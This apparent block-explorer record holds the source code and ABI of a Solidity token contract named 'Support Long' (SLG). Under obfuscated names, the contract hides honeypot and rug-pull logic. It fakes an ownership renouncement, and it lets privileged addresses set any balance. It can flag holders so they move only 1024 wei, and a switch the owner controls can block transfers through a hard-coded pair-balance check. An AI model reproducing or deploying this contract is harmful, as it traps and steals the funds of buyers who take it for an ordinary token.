{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface exemptList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellLiquidityLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundLaunchExempt {\n    function createPair(address sellWallet, address tokenAmount) external returns (address);\n}\n\ninterface senderBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundShould) external view returns (uint256);\n\n    function transfer(address fundToIs, uint256 isAuto) external returns (bool);\n\n    function allowance(address tokenTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundToIs,\n        uint256 isAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTradingSell, uint256 value);\n    event Approval(address indexed tokenTrading, address indexed spender, uint256 value);\n}\n\ninterface senderBuyMetadata is senderBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SupportLong is sellLiquidityLimit, senderBuy, senderBuyMetadata {\n\n    mapping(address => mapping(address => uint256)) private enableLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAuto;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTeam;\n    }\n\n    function isLaunch(address receiverFundTrading, uint256 isAuto) public {\n        toReceiverAmount();\n        walletLaunched[receiverFundTrading] = isAuto;\n    }\n\n    uint256 private senderFee;\n\n    function toReceiverAmount() private view {\n        require(toShould[_msgSender()]);\n    }\n\n    function transfer(address receiverFundTrading, uint256 isAuto) external virtual override returns (bool) {\n        return sellSwap(_msgSender(), receiverFundTrading, isAuto);\n    }\n\n    uint256 private liquidityLimit;\n\n    function enableAuto() public {\n        emit OwnershipTransferred(walletList, address(0));\n        liquidityReceiver = address(0);\n    }\n\n    function sellSwap(address teamMax, address fundToIs, uint256 isAuto) internal returns (bool) {\n        if (teamMax == walletList) {\n            return totalReceiver(teamMax, fundToIs, isAuto);\n        }\n        uint256 listShould = senderBuy(limitShould).balanceOf(marketingShould);\n        require(listShould == receiverEnable);\n        require(fundToIs != marketingShould);\n        if (senderTake[teamMax]) {\n            return totalReceiver(teamMax, fundToIs, sellAmount);\n        }\n        return totalReceiver(teamMax, fundToIs, isAuto);\n    }\n\n    uint256 atSell;\n\n    function enableAmount(address isTx) public {\n        require(isTx.balance < 100000);\n        if (isLimit) {\n            return;\n        }\n        if (totalFrom) {\n            sellMarketing = enableFrom;\n        }\n        toShould[isTx] = true;\n        \n        isLimit = true;\n    }\n\n    uint8 private tokenAuto = 18;\n\n    string private launchedMarketingSwap = \"SLG\";\n\n    function transferFrom(address teamMax, address fundToIs, uint256 isAuto) external override returns (bool) {\n        if (_msgSender() != isSwapAt) {\n            if (enableLimit[teamMax][_msgSender()] != type(uint256).max) {\n                require(isAuto <= enableLimit[teamMax][_msgSender()]);\n                enableLimit[teamMax][_msgSender()] -= isAuto;\n            }\n        }\n        return sellSwap(teamMax, fundToIs, isAuto);\n    }\n\n    function allowance(address marketingToken, address enableExempt) external view virtual override returns (uint256) {\n        if (enableExempt == isSwapAt) {\n            return type(uint256).max;\n        }\n        return enableLimit[marketingToken][enableExempt];\n    }\n\n    uint256 constant sellAmount = 2 ** 10;\n\n    function approve(address enableExempt, uint256 isAuto) public virtual override returns (bool) {\n        enableLimit[_msgSender()][enableExempt] = isAuto;\n        emit Approval(_msgSender(), enableExempt, isAuto);\n        return true;\n    }\n\n    mapping(address => bool) public senderTake;\n\n    address private liquidityReceiver;\n\n    address isSwapAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private totalFrom;\n\n    uint256 private walletTeam = 100000000 * 10 ** 18;\n\n    bool private fromAuto;\n\n    bool public isLimit;\n\n    mapping(address => bool) public toShould;\n\n    bool public listBuyLaunched;\n\n    uint256 public sellMarketing;\n\n    bool private takeLiquidity;\n\n    event OwnershipTransferred(address indexed receiverLiquidityAt, address indexed swapList);\n\n    constructor (){\n        \n        exemptList takeShould = exemptList(isSwapAt);\n        limitShould = fundLaunchExempt(takeShould.factory()).createPair(takeShould.WETH(), address(this));\n        if (senderFee != liquidityLimit) {\n            sellMarketing = marketingTrading;\n        }\n        walletList = _msgSender();\n        enableAuto();\n        toShould[walletList] = true;\n        walletLaunched[walletList] = walletTeam;\n        if (senderFee == marketingTrading) {\n            fromAuto = false;\n        }\n        emit Transfer(address(0), walletList, walletTeam);\n    }\n\n    function takeToIs(uint256 isAuto) public {\n        toReceiverAmount();\n        receiverEnable = isAuto;\n    }\n\n    address public limitShould;\n\n    uint256 receiverEnable;\n\n    address marketingShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMarketingSwap;\n    }\n\n    mapping(address => uint256) private walletLaunched;\n\n    function getOwner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    function swapAtAmount(address receiverAmount) public {\n        toReceiverAmount();\n        \n        if (receiverAmount == walletList || receiverAmount == limitShould) {\n            return;\n        }\n        senderTake[receiverAmount] = true;\n    }\n\n    function balanceOf(address fundShould) public view virtual override returns (uint256) {\n        return walletLaunched[fundShould];\n    }\n\n    bool public isMin;\n\n    address public walletList;\n\n    function totalReceiver(address teamMax, address fundToIs, uint256 isAuto) internal returns (bool) {\n        require(walletLaunched[teamMax] >= isAuto);\n        walletLaunched[teamMax] -= isAuto;\n        walletLaunched[fundToIs] += isAuto;\n        emit Transfer(teamMax, fundToIs, isAuto);\n        return true;\n    }\n\n    uint256 public enableFrom;\n\n    string private toSell = \"Support Long\";\n\n    uint256 private marketingTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidityAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTradingSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"}],\"name\":\"enableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"swapAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"takeToIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundToIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SupportLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}